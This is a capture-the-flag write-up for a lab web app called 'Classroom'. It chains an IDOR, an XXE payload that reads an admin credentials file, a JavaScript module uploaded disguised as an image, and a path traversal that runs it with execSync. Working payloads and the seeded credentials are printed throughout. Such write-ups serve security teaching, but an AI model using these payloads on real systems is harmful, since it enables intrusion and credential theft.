# Classroom

## Summary

The challenge is solved by chaining four weaknesses:

1. An IDOR exposes a lecturer's private note to any authenticated user.
2. The lecturer account enables access to an XXE vulnerability in the XML importer.
3. XXE reads the administrator backup and reveals the admin username.
4. An admin-only upload accepts JavaScript disguised as an image, while the module runner loads files through a path traversal. The uploaded module executes commands and reads the flag.

The flag filename is randomized at container startup, so it must be discovered rather than guessed.

## Setup

Register a normal student account and log in.

## 1. IDOR: Read the Lecturer's Private Note

The notes route verifies only that the requester is authenticated. It queries the requested note ID without checking that the note belongs to the current user:

```javascript
router.get('/:id', isAuthenticated, (req, res) => {
  const note = db.prepare(
    'SELECT n.*, u.username as author FROM notes n JOIN users u ON n.user_id = u.id WHERE n.id = ?'
  ).get(req.params.id);
```

The seed data creates the lecturer's credential note first, so request note `1` as the student

The response contains a lecturer username and password. The password in the seed data is:

```text
L3ctur3rS3cur3P@ss2026!
```

Use the username shown in the response to log in as the lecturer.

## 2. XXE: Read the Administrator Backup

Lecturers can use `/courses/import`. The parser enables entity expansion and DTD loading:

```javascript
const xmlDoc = libxmljs.parseXml(xmlData, {
  noent: true,
  dtdload: true,
  dtdvalid: false,
});
```

Submit an XML document with an external entity pointing to the backup file. The importer displays the expanded entity as the root content:

```bash
<?xml version="1.0"?><!DOCTYPE roster [<!ENTITY xxe SYSTEM "file:///app/backup/admin_credentials.json">]><roster>&xxe;</roster>
```

The response reveals the randomly generated administrator username and the bcrypt password hash from `admin_credentials.json`:

The administrator password is crackable with rockyou.txt and found the raw password is `gymclassheroes`.

## 3. Upload JavaScript Disguised as an Image

The administrator upload endpoint checks only the extension supplied in the original filename. It does not validate the file contents:

```javascript
const allowedExt = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg'];
const ext = path.extname(file.originalname).toLowerCase();
```

Create a CommonJS module with a permitted image extension:

```javascript
module.exports = {
  name: 'lsroot',
  run: () => ({ output: require('child_process').execSync('ls -la /').toString() })
};
```

Save it locally as `payload.jpg` and upload it.

The upload response contains a generated filename such as `1750000000000-123456789-payload.jpg`. Record that exact name.

## 4. Path Traversal in the Module Runner

The module endpoint joins the user-controlled `name` with the modules directory and then passes the result to Node's `require`:

```javascript
const fullPath = path.resolve(path.join(modulesDir, moduleName));
const mod = require(fullPath);
```

There is no restriction that `moduleName` stays inside `modulesDir`. Traverse from `modules` to `public/uploads` and load the uploaded file:

```text
/admin/modules?name=../public/uploads/<GENERATED_FILENAME>
```

Node executes the module's `run()` function. It lists the randomized root-level text file and prints its contents, revealing the flag name.